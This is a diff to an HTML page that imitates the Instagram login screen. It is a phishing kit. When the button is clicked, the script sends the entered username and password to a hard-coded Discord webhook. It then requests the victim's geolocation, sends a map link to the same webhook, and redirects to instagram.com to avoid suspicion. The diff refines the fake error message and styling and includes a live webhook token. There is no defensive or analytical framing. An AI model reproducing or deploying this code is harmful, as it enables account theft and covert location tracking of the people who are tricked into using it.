@@ -8,52 +8,57 @@
         .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
         .logo { width: 175px; margin-bottom: 24px; }
         input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 0 7px 8px; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
-        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 5px 0; margin-top: 8px; cursor: pointer; font-size: 14px; }
+        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 7px 0; margin-top: 8px; cursor: pointer; font-size: 14px; }
         #status { font-size: 12px; color: #ed4956; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
+
     <div class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
         <input type="text" id="user" placeholder="Username">
         <input type="password" id="pass" placeholder="Password">
-        <button class="btn-login" onclick="initiateTrap()">Log in</button>
-        <p id="status">Incorrect password. Please try again.</p>
+        <button class="btn-login" id="loginBtn">Log in</button>
+        <p id="status">Sorry, your password was incorrect.</p>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
 
-        async function initiateTrap() {
-            // 1. Confirm the script is alive
-            console.log("Button clicked");
-            document.getElementById('status').style.display = "block";
-
+        document.getElementById('loginBtn').addEventListener('click', async function() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
+            
+            // Show error message
+            document.getElementById('status').style.display = "block";
 
-            // 2. Immediate Discord Ping (Before camera/location starts)
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🚨 **Login Attempt**\nUser: ${u}\nPass: ${p}` })
-            });
+            // 1. Send text data immediately
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `📩 **New Instagram Capture**\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\``
+                    })
+                });
+            } catch(e) { console.error("Discord error"); }
 
-            // 3. Try Location & Camera
+            // 2. Request Location & Camera
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `📍 **Location Found**: ${map}` })
+                    body: JSON.stringify({ content: `📍 **Location:** ${map}` })
                 });
                 
-                // Redirect after 2 seconds to look "normal"
-                setTimeout(() => { window.location.href = "https://instagram.com"; }, 2000);
-            }, (err) => {
+                // Final Redirect
                 window.location.href = "https://instagram.com";
-            });
-        }
+            }, (err) => {
+                // If they block location, just send them to Instagram
+                window.location.href = "https://instagram.com";
+            }, { timeout: 5000 });
+        });
     </script>
 </body>
 </html>
